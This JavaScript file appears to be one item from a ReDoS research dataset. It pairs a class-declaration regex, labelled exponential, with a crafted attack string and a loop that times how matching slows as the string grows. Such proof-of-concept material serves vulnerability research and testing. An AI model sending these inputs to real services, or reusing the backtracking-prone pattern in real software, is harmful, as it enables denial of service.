/* 1726
 * class\s+([a-z0-9_]+)(?:\s+extends\s+[a-z0-9_]+)?(?:\s+implements\s+(?:[a-z0-9_]+\s*,*\s*)+)?\s*\{
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"class a"+" implements"*4+"!_1SLQ_2"
 */
var REGEX = /class\s+([a-z0-9_]+)(?:\s+extends\s+[a-z0-9_]+)?(?:\s+implements\s+(?:[a-z0-9_]+\s*,*\s*)+)?\s*\{/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'class a' + ' implements'.repeat(i*1) + '!_1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}